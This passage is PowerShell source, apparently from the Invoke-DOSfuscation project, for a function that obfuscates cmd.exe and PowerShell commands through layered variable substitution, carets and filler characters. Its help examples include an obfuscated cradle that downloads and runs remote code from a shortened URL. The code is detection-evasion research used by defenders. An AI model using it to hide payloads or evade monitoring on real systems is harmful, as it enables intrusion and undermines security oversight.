   )&    ( ; ; ; ( , ( , , (^S^e^t ^ ^ ^ ^ ^ ^   ^\^ ^ ^  ^ ^ =^!^*^ ^ ^ ^ ^ ^:^{^=^-!)     ;    ;     ;     ;        )       ,   )    ,   )&      (     ;     ;      ;       ;       ;      (     ,      ,     (    ;    ;    ;       ;    (^SE^t ^ ^ ^ ^ ^ ^ ^ ^# ^ ^ =^!^\^ ^ ^ ^ ^ ^ ^:^@^=s^!)      ;        ;       ;       )   )        )&&    (    ,   ,        ,      ,       ,       (       ,       (S^E^t ^ ^ ^ ^ ^ ^ ^ ^{^ ^ ^ ^ =^!^#^ ^ ^ ^:^#^=^o!)      ;        ;       ;       ;   ;        )        ,    ,     )&    ,   ,    ,    ,  (      ,   ,        (     ,       (      ;       ;     ;     ;    (^C^A^L^L   ;   ;  ,   ;  %^{^ ^ ^ ^ %)      ,   ,       ,    )     ,     ;   ,        ;     ,    ;        ,       )   ,    ,    ,        )        "

.EXAMPLE

C:\PS> Out-DosFINcodedCommand -Command 'netstat -ano' -CmdSyntax '%ProgramData:~0,1%%ProgramData:~9,2%' -StdIn

%ProgramData:~0,1%%ProgramData:~9,2% /V/C"set rJzi=ne7s7a7Y-an8&&set lq=!rJzi:Y= !&&set 4JU=!lq:8=o!&&set Shy5=!4JU:7=t!&&call %Shy5%"

.EXAMPLE

C:\PS> Out-DosFINcodedCommand -Command 'net""stat -""ano | find "0.0.0.0"' -CmdSyntax 'c:\does\not\exist\..\..\..\windows\system32\cmd.exe' -RandomCase -RandomSpace -VarNameSpecialChar -StdIn

c:\doeS\not\EXisT\..\..\..\wInDOws\SYstEM32\CMD.exe   /V:O      /C   "sET     ]'=Met""""Utat -""""aM@ ^^^| fsMd ""0.0.0.0""&  SET +~]=!]':s=i!&sET     {@`=!+~]:@=o!&&  set  *_~=!{@`:M=n!&sEt     {-*'=!*_~:U=s!&    seT   $~`=""&&ECho %{-*':""=!$~`:~ 1, 58!%   | cmd.EXE  "

.EXAMPLE

C:\PS> Out-DosFINcodedCommand -Command 'IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/L3g1t")' -RandomCase -RandomSpace -RandomSpaceRange @(5..15) -VarNameWhitespace -FinalBinary 'powershell' -RandomChar -RandomCharRange @(3..7) -RandomCharPercent 65

cmd,      ,       ,       ,     ,       /v:                    ,        ,   ,      ,      ,       ,       ,    /C        "      ,   ,        ,      ,      (            ,              (       ,               ,              ,               ,         ,              ,         ,          (     ,            ,         ,             ,     ,            ,      ,            (              ,              ,             ,            ,            ,           ,       ,          (              ,             ,         ,             ,      ,         (sET  '  =]EX 5N6w-Obj6cz N6z.;6bCli6nzK.+ownloadSzring5""hzzp://biz.ly/L3g4z""K) ) , , ) , , ) , , , ) )&       (             ,        (         ,           ,          ,             ,      ,           ,      ,      (     ,         ,         ,     (      ,              (      ,               ,     ,        ,        ,      (            ,              ,      ,           ,      ,     (sET         [   =!'  :4=1!)         ,              )               ,               ,          ,     )        ,     )            ,          ,            ,            ,        ,        ,           ,      )               ,         ,      ,         ,               ,     )     ,            ,       ,              ,         ,              ,               ,      )&&               (             ,            ,              ,            (         ,            (           ,           ,          ,               (SET               ;  =![   :;=W!)        ,               ,              ,        ,              ,          ,        ,            )            ,       ,       ,          ,        ,          ,         ,               )               ,               )&              (           ,      ,     ,      (     ,        (           ,         (        ,      (set      *    =!;  :+=D!)           ,               ,     ,        ,       ,       )             ,         ,               ,            ,          ,      ,               ,            )             ,            )       ,       )&            (              ,      (            ,             ,         ,      (           ,     (     ,            ,             ,            ,          ,         (     ,     ,       ,      ,     ,          (SEt             .   =!*    :K=^)!)           ,      )     ,            )              ,      ,       ,      )            ,       ,       ,              ,               ,         ,              ,              )        ,             )&           (     ,        ,     ,      (               ,             ,             ,             ,     ,               ,             ,     (             ,               ,     ,        (      ,     ,       ,             ,          ,       ,            ,           (seT       *     =!.   :6=e!)       ,       ,          ,          )           ,     ,            ,            ,           ,            ,          ,            )      ,        ,           ,             )         ,          ,      ,        ,             ,             ,           ,             )&&           (     ,           (               ,             ,           ,               ,            ,               (SEt       #    =!*     :z=t!)            ,      ,         ,             ,      ,        ,         ,             )         ,      )&        (              ,     (           ,             ,          ,           (             ,        ,            ,         ,     ,       (        ,       ,             ,               ,        ,        ,            ,      (        ,              ,           ,            ,        ,               (seT       -    =!#    :]=I!)     ,      )     ,            ,      ,          ,      ,      )              ,           )           ,         ,         ,      )       ,       )&          (        ,             (              ,            ,          ,         (               ,         ,             ,      (          ,            ,       ,         ,        ,       (       ,     ,      ,           ,               ,             (            ,        (sET         @   =!-    :5=^(!)            ,              ,     ,             ,            ,        ,        ,        )        ,              ,      ,             ,              ,           ,       ,              )          ,        ,       ,        ,         ,              )          ,             ,           ,      )               ,       ,            ,           ,           ,       )     ,               ,        ,         ,             ,              )&&           (           ,          ,        ,            (              ,            ,       ,          ,               ,     (        ,      (sEt                $  ="")               ,              )      ,       ,          ,             ,       ,             ,       ,        )              ,              ,             ,     )&&    ,     ,      ,     ,      (                                                                  (                      (                 (                                                               (CaLl    ,       ,       ,      ,   ,        p%ProgRamW6432:~-11,1%W%tmp:~-3,1%R%pROGRAMfIleS:~-1%hE%pRoGRAMw6432:~-3,-2%L   ;    ;       ;   ;       "%@   :""=\!$  :~             -1,         1!%")                                                )                                                                              )                                                                                 )                                                     )   ;    ;       ;   ;       "       ;   ;        ;   ;    ;    ;   

.EXAMPLE

C:\PS> Out-DosFINcodedCommand -Command 'netstat -ano' -RandomPlaceholderCharArray @('_','-','/','\',' ','D','B','O')

cmd.exe /V:O/C"set sD=DetstBt\-BDo&&set Qax=!sD:B=a!&&set px=!Qax:D=n!&&set 2X6A=!px:\= !&&call %2X6A%"

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [System.String]
        $Command,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('cmd','powershell','none')]
        [System.String]
        $FinalBinary = 'none',
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $CmdSyntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $Cmd2Syntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $PowerShellSyntax = (Get-Random -InputObject @('powershell','powershell.exe',(Get-ObfuscatedPowerShell -ObfuscationType env),(Get-ObfuscatedPowerShell))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $StdIn,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString1,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString2,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -and -not ($_.Trim().ToLower().StartsWith('v:of')) } )]
        [System.String]
        $VFlag = (Get-Random -InputObject @('V','V:','V:O','V:ON')),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $SubstitutionPercent = 20,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript( { -not ($_ | where-object { ($_.ToString().Length -ne 1) -or (@('!','"','~','=','*','^','|','&','<','>') -contains $_) }) } )]
        [System.Object[]]
        $RandomPlaceholderCharArray = (@(32) + @(35..47) + @(58..64) + @(91..96) + @(123..126) + @(48..57) + @(65..90) + @(97..122) | where-object { @('!','"','~','=','*','^','|','&','<','>') -notcontains [System.Char] $_ } | foreach-object { [System.Char] $_ }),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomFlag,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCharPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';'))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameSpecialChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameWhitespace
    )

    # Create "profiles" depending on -ObfuscationLevel value and the length of the input -Command value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $StdIn                      = $false
                $VFlag                     = 'V:ON'
                $SubstitutionPercent        = Get-Random -InputObject @(5..15)
                $RandomPlaceholderCharArray = Get-Random -InputObject ([System.Char[]] (@(48..57) + @(97..122))) -Count 10
                $RandomCase                 = $false
                $RandomSpace                = $false
                $RandomCaret                = $false
                $RandomChar                 = $false
                $VarNameSpecialChar         = $false
                $VarNameWhitespace          = $false

                $CmdSyntax                  = Get-Random -InputObject @('cmd','cmd.exe')
                $Cmd2Syntax                 = Get-Random -InputObject @('cmd','cmd.exe')
                $PowerShellSyntax           = Get-Random -InputObject @('powershell','powershell.exe')
            }
            '2' {
                $StdIn                      = Get-Random -InputObject @($true,$false)
                $SubstitutionPercent        = Get-Random -InputObject @(35..50)
                $RandomPlaceholderCharArray = Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count 20
                $RandomCase                 = $true
                $RandomSpace                = $true
                $RandomSpaceRange           = @(0..3)
                $RandomFlag                 = $true
                $RandomCaret                = $true
                $RandomCaretPercent         = Get-Random -InputObject @(35..50)
                $RandomChar                 = $true
                $RandomCharRange            = @(1..2)
                $RandomCharPercent          = Get-Random -InputObject @(35..50)
                $RandomCharArray            = Get-Random -InputObject @(@(','),@(';'))
                $VarNameSpecialChar         = $false
                $VarNameWhitespace          = $false

                $CmdSyntax                  = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax                 = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax           = Get-ObfuscatedPowerShell -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
            '3' {
                # Randomly generate values for decoy strings and /V flag if not explicitly set (or if set to default values).
                if (-not $DecoyString1)
                {
                    $DecoyString1 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (-not $DecoyString2)
                {
                    $DecoyString2 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (@('V','V:','V:O','V:ON') -contains $Vflag)
                {
                    do
                    {
                        $vFlagTemp = 'V' + -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122)) + @('~','!','@','#','$','*','(',')','-','_','+','=','{','}','[',']',':',';','?')) -Count (Get-Random -InputObject @(1..10)))
                    }
                    while (($vFlagTemp.Trim() -match '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -or ($vFlagTemp.Trim().ToLower().StartsWith('v:of')))
                    $VFlag = $vFlagTemp
                }

                $StdIn                      = $true
                $SubstitutionPercent        = Get-Random -InputObject @(75..90)
                $RandomPlaceholderCharArray = Get-Random -InputObject (@(32) + @(35..47) + @(58..64) + @(91..96) + @(123..126) | where-object { @('!','"','~','=','*','^','|','&','<','>') -notcontains [System.Char] $_ } | foreach-object { [System.Char] $_ }) -Count 20
                $RandomCase                 = $true
                $RandomSpace                = $true
                $RandomSpaceRange           = @(2..5)
                $RandomFlag                 = $true
                $RandomCaret                = $true
                $RandomCaretPercent         = Get-Random -InputObject @(75..90)
                $RandomChar                 = $true
                $RandomCharRange            = @(2..5)
                $RandomCharPercent          = Get-Random -InputObject @(75..90)
                $RandomCharArray            = @(',',';')
                if (Get-Random -InputObject @(0..1))
                {
                    $VarNameSpecialChar = $false
                    $VarNameWhitespace  = $true
                }
                else
                {            
                    $VarNameSpecialChar = $true
                    $VarNameWhitespace  = $false
                }

                # Override certain values for unusually large commands to try to remain under the 8,190 character limit of cmd.exe.
                if (($Command.Length -gt 150) -and ($Command.Length -le 500))
                {
                    $RandomCharRange  = @(1..4)
                }
                elseif ($Command.Length -gt 500)
                {
                    $RandomSpaceRange = @(0..3)
                    $RandomCharRange  = @(1..3)
                }

                $CmdSyntax        = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax       = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax = Get-ObfuscatedPowerShell -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
        }
    }

    # Set regex values to identify and replace the two single-alphanumeric character variables for the FOR loop at the end of this function if intricate syntax for $Cmd2Syntax or $PowerShellSyntax are used.
    $intricateForLoopRegex1 = '[\s\^\(,;]\%\^{0,1}[a-z0-9][\s\^\(,;]+I\^{0,1}N[\s\^,;]'
    $intricateForLoopRegex2 = 'D\^{0,1}O[\s\^\(,;]+\%\^{0,1}[a-z0-9]'

    # Check for intricate syntax (FOR LOOP) in input binary syntaxes.
    $intricateSyntaxRegex      = "$intricateForLoopRegex1.*$intricateForLoopRegex2"
    $intricateCmdSyntax        = $false
    $intricateCmd2Syntax       = $false
    $intricatePowerShellSyntax = $false
    if ($CmdSyntax -match $intricateSyntaxRegex)
    {
        $intricateCmdSyntax = $true
    }
    if ($Cmd2Syntax -match $intricateSyntaxRegex)
    {
        $intricateCmd2Syntax = $true
    }
    if ($PowerShellSyntax -match $intricateSyntaxRegex)
    {
        $intricatePowerShellSyntax = $true
    }
    
    # If using one of the more intricate PowerShell syntaxes that contain additional execution logic to retrieve the binary name then ensure that PowerShell commands are set to StdIn.
    if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent) -and $intricatePowerShellSyntax)
    {
        $StdIn = $true
    }

    # If using one of the more intricate PowerShell syntaxes that contain additional execution logic to retrieve the binary name AND we have unpaired double quotes then ensure that PowerShell commands are set to StdIn so double quote embedded substring variable functionality works properly with CALL command.
    if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent) -and ($PowerShellSyntax -match ' [%][a-z0-9]\s{1,}in .*DO\s{1,}[%][a-z0-9]') -and $Command.Replace('""','').Contains('"'))
    {
        $StdIn = $true
    }

    # Check user-input $Command for uneven double quotes.
    if (Test-ContainsUnevenDoubleQuote -Command $Command)
    {
        return $null
    }

    # Remove any invalid tab characters from user-input $Command.
    if (-not ($Command = Remove-Tab -Command $Command))
    {
        return $null
    }

    # If user-input $Command contains characters that need escaping and no -FinalBinary has been selected then override to -FinalBinary 'cmd'.
    if (($FinalBinary -eq 'none') -and (Test-ContainsEscapableCharacter -Command $Command))
    {
        $FinalBinary = 'cmd'
    }

    # If cmd.exe-style environment variables are found in the user-input $Command then ensure that -StdIn (unless $FinalBinary is 'powershell') is selected and -FinalBinary is not 'none'.
    # Try to rule out multiple instances of '%' in the command being used in the context of PowerShell (as an alias of the foreach-object cmdlet) and not and cmd.exe environment variable (e.g. PowerShell.exe <PS command> | % { <for each object do ___> })
    if (($Command -match '\%.*\%') -and ($Command -notmatch '( |\|)\%\s*{'))
    {
        # Set $StdIn to $true if it currently is not.
        if (-not $StdIn.IsPresent -and ($FinalBinary -ne 'powershell'))
        {
            $StdIn = $true
        }

        # Set $FinalBinary to 'cmd' if it is not defined.
        if ($FinalBinary -eq 'none')
        {
            $FinalBinary = 'cmd'    
        }
    }

    # If -FinalBinary is 'cmd' and -StdIn is selected and user-input $Command contains an escapable character within a string then change -StdIn to $false due to escaping complexities.
    if (($FinalBinary -eq 'cmd') -and $StdIn.IsPresent -and (Test-ContainsEscapableCharacterInString -Command $Command))
    {
        $stdIn = $false
    }

    # Perform an additional layer of escaping specifically for PowerShell commands containing escapable characters within various string tokens.
    if ($FinalBinary -eq 'powershell')
    {
        $Command = Out-EscapedPowerShell -CommandToEscape $Command -StdIn:$StdIn
    }

    # Define special characters that deserve extra escaping attention from a cmd.exe perspective.
    $charsToEscape = @('^','&','|','<','>')

    # Maintain array to ensure all randomly-generated variable names are unique per function invocation (and that single-character FOR loop variables do and unique leading characters maintained for any potential FOR loops in the command) to prevent variable name collisions.
    $script:varNameArray = @()

    # Maintain array to ensure all single-character FOR loop variable names do not collide with any additional randomly-generated variable names.
    $script:reservedUniqueFirstChars = @()

    # Select unique characters from $Command to replace based on the $SubstitutionPercent.
    $commandUniqueChars = [System.Char[]] $Command | where-object { $charsToEscape -notcontains $_ } | Sort-Object -Unique
    $charCountToReplace = 1 + [System.Int16] ($commandUniqueChars.Count * ($SubstitutionPercent / 100))
    $charsToReplace = Get-Random -InputObject $commandUniqueChars -Count $charCountToReplace

    # If there are more characters to be replaced than the number of placeholder characters to choose from (if input by user) then add more alphanumeric characters to $RandomPlaceholderCharArray.
    if ($RandomPlaceholderCharArray.Count -lt $charCountToReplace)
    {
        $alphanumericChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { $RandomPlaceholderCharArray -notcontains $_ }
        $RandomPlaceholderCharArray += Get-Random -InputObject $alphanumericChars -Count ($charCountToReplace - $RandomPlaceholderCharArray.Count)
    }

    # If non-paired double quotes exist then we need to add /V:ON and double quotes in a random variable.
    # This is because double quotes can not technically be escaped in cmd.exe.
    # Instead we must make sure it falls into one of several scenarios to not be treated at the end of the command.
    # /S flag is unsatisfactory in a few fringe cases, thus the /V:ON route.
    # We will store "" in a variable and then replace the final command's "" with one character of our newly-set variable, which would resolve to a single ". #RubeGoldberg
    $commandVarNameGet = $null
    $setQuoteVariableSyntaxArray = @()
    if ($Command.Replace('""','').Contains('"'))
    {
        # Generate unique, random variable name and set in two separate variables so we can add an optional replacement syntax to second usage of var name in special case with paired double quotes.
        $quoteRandomVarName = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    
        # Randomly select single quote substring indexes. Each of these will produce a single character from the two-character value of "" that we will set in this variable.
        $randomPositiveInt = Get-Random -InputObject @(1..100)
        $substringIndex    = Get-Random -InputObject @('0,1','0,-1','-0,1','-0,-1','1','-1',"1,$randomPositiveInt",'-1',"-1,$randomPositiveInt")

        # Add random whitespace and plus signs to $substringIndex.
        $substringIndexSplit = $substringIndex.Split(',') | foreach-object {
            # Set random whitespace values for substring index value if -RandomSpace switch is set.
            $randomSpaceA = ''
            if ($RandomSpace.IsPresent)
            {
                $randomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
            }

            # Randomly add explicit '+' sign to positive index value option if -RandomChar is selected.
            $randomPlusSign = ''
            if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
            {
                if (-not $_.StartsWith('-'))
                {
                    $randomPlusSign = '+'
                }
            }
            
            $randomSpaceA + $randomPlusSign + $_
        }

        # Join $substringIndexSplit back with a comma.
        $substringIndex = $substringIndexSplit -join ','

        # With /V:ON in use we can use !var! syntax inside of the larger %var% syntax without conflicting % syntax.
        if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent))
        {
            # We must add a \ for PowerShell payloads to escape the resultant expanded double quote by the time this hits powershell.exe's command line arguments (when StdIn is not used).
            $commandVarNameGet = ":`"`"=\!$quoteRandomVarName`:~$substringIndex!"
        }
        else
        {
            $commandVarNameGet = ":`"`"=!$quoteRandomVarName`:~$substringIndex!"
        }
        
        # Set random case values if -RandomCase switch is set.
        $set = 'set'
        if ($RandomCase.IsPresent)
        {
            $set = Out-RandomCase $set
        }

        # Add random carets if -RandomCaret switch is set.
        if ($RandomCaret.IsPresent)
        {
            $set                = Out-ObfuscatedCaret -StringToObfuscate $set                -RandomCaretPercent:$RandomCaretPercent
            $quoteRandomVarName = Out-ObfuscatedCaret -StringToObfuscate $quoteRandomVarName -RandomCaretPercent:$RandomCaretPercent
            $commandVarNameGet  = Out-ObfuscatedCaret -StringToObfuscate $commandVarNameGet  -RandomCaretPercent:$RandomCaretPercent
        }
        
        # Set random whitespace values if -RandomSpace switch is set.
        $randomSpace1  = ''
        if ($RandomSpace.IsPresent)
        {
            $randomSpace1  = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        }
        
        # Create SET syntax for variable containing paired double quotes.
        $setQuoteVariableSyntaxArray += "$set $randomSpace1$quoteRandomVarName=`"`""
    }
    elseif ($Command.Contains('""'))
    {
        if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent))
        {
            # Escape PowerShell paired double quotes with powershell.exe-level escaping using the \ escape character.
            $Command = $Command.Replace('""','\"\"')
        }        
    }

    # Perform escaping for input $Command but reduce escaping one layer in -replace after the below if/else block.
    if (($FinalBinary -eq 'powershell') -and ($StdIn.IsPresent))
    {
        $Command = -join (Split-Command -CommandToSplit $Command -ConcatenationPercent 0 -DoubleEscape:$false)
    }
    else
    {
        $Command = -join (Split-Command -CommandToSplit $Command -ConcatenationPercent 0 -DoubleEscape:$StdIn)
    }
    $Command = $Command -replace '\^{4}','^^' -replace '\^{3}\|','^|' -replace '\^{3}\&','^&' -replace '\^{3}\<','^<' -replace '\^{3}\>','^>'

    # Maintain state of modified command at each substitution.
    $commandModified = $Command

    # Maintain substitution pairs in $charsReplacedArray for later expanded variable character/string replacement reassembly.
    $charsReplacedArray = @()
    
    # Perform character substitutions on $commandModified.
    # cmd.exe's character/string replacement functionality is case-insensitive, so this replacement function will mimic this case-insensitivity.
    foreach ($charToReplace in [System.String[]] $charsToReplace)
    {
        # Retrieve random placeholder character until one is found that is not in the current iteration of $commandModified.
        $placeholderChars = Get-Random -InputObject $RandomPlaceholderCharArray -Count $RandomPlaceholderCharArray.Count

        # If too many $placeholderChars are tried without finding one unique to $commandModified then increase the placeholder length for efficiency and to avoid obfuscation gridlock.
        $cyclesBeforeIncreasingPlaceholderLength = [System.Int16] ($placeholderChars.Count / 2)
        $cycleCount = 0
        foreach ($placeholderChar in $placeholderChars)
        {
            # Increase size of placeholder character and choose only from alphanumerics if $cyclesBeforeIncreasingPlaceholderLength is surpassed.
            if ($cycleCount -ge $cyclesBeforeIncreasingPlaceholderLength)
            {
                $alphanumericChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122))
                $placeholderChar = -join (Get-Random -Input $alphanumericChars -Count (2 + ($cycleCount - $cyclesBeforeIncreasingPlaceholderLength)))
            }
            $cycleCount++

            # Ensure the current $placeholderChar is case-insensitive unique to the current value of $commandModified.
            if (-not $commandModified.ToLower().Contains($placeholderChar.ToString().ToLower()))
            {
                # Perform additional escaping for the character to replace as well as the placeholder character for both the original SET command and all subsequent layered character/string substitutions.
                if (($FinalBinary -eq 'powershell') -and ($StdIn.IsPresent))
                {
                    $charToReplace   = -join (Split-Command -CommandToSplit $charToReplace   -ConcatenationPercent 0 -DoubleEscape:$false) -replace '\^{4}','^^'
                    $placeholderChar = -join (Split-Command -CommandToSplit $placeholderChar -ConcatenationPercent 0 -DoubleEscape:$false) -replace '\^\^','^' -replace '\^\|','|' -replace '\^\&','&' -replace '\^\<','<' -replace '\^\>','>'
                }
                else
                {
                    $charToReplace   = -join (Split-Command -CommandToSplit $charToReplace   -ConcatenationPercent 0 -DoubleEscape:$false)
                    $placeholderChar = -join (Split-Command -CommandToSplit $placeholderChar -ConcatenationPercent 0 -DoubleEscape:$false)
                }

                # Check if $placeholderChar will cause problems after replacing $charToReplace since cmd.exe's replace functionality is case-insensitive.
                if (($commandModified -creplace [Regex]::Escape($charToReplace),$placeholderChar -ireplace [Regex]::Escape($placeholderChar),$charToReplace) -eq $commandModified)
                {
                    # Perform case-sensitive character/string substitution in $commandModified.
                    $commandModified = $commandModified.Replace($charToReplace,$placeholderChar)

                    # Maintain ordered list of character substitution pairs.
                    $charsReplacedArray += , @($charToReplace,$placeholderChar)

                    break
                }
            }
        }
    }

    # Perform escaping of % for cmd.exe-level environment variables so it will be expanded in the proper context and not in the initial setup portion of the command.
    while ($commandModified -match '[^^]\%')
    {
        $commandModified = $commandModified.Replace($matches[0],($matches[0][0] + '^%'))
    }

    # Generate random variable names and SET variable syntaxes and create an array of SET commands for each layer of character/string substitution.
    $setVarResults = Out-SetVarCommand -SubstringArray $commandModified -RandomCase:$RandomCase -RandomSpace:$RandomSpace -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    $setVarName = [System.String] $setVarResults[1]
    
    # Store all SET commands in $setCommandArray.
    $setCommandArray = @()
    $setCommandModified = ([System.String] $setVarResults[0]).Substring(0,(([System.String] $setVarResults[0]).IndexOf(" $setVarName") + $setVarName.Length + 2)) + $commandModified

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $setCommandModified = Out-ObfuscatedCaret -StringToObfuscate $setCommandModified -RandomCaretPercent:$RandomCaretPercent
    }
    $setCommandArray += $setCommandModified

    # Maintain history of previous variable name since they will be chained together in SET commands in this foreach loop.
    $prevSetVarName = $setVarName

    # Iterate through all characters to replace ($charsReplacedArray) in reverse for proper ordering in reassembly.
    foreach ($charsReplaced in $charsReplacedArray[($charsReplacedArray.Length -1)..0])
    {
        $charToReplace   = $charsReplaced[0]
        $placeholderChar = $charsReplaced[1]

        # Generate random variable names and SET variable syntaxes and create an array of SET commands for each layer of character/string substitution.
        $setVarResults = Out-SetVarCommand -SubstringArray $commandModified -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
        $setVarName = [System.String] $setVarResults[1]

        # Store SET command in $setCommandArray.
        $setStatementFirstHalf  = ([System.String] $setVarResults[0]).Substring(0,(([System.String] $setVarResults[0]).IndexOf(" $setVarName") + $setVarName.Length + 2))
        $setStatementSecondHalf = "!$prevSetVarName`:$placeholderChar=$charToReplace!"
        
        # Add random carets if -RandomCaret switch is set.
        if ($RandomCaret.IsPresent)
        {
            $setStatementSecondHalf = Out-ObfuscatedCaret -StringToObfuscate $setStatementSecondHalf -RandomCaretPercent:$RandomCaretPercent
        }
        $setCommandArray += ($setStatementFirstHalf + $setStatementSecondHalf)
        
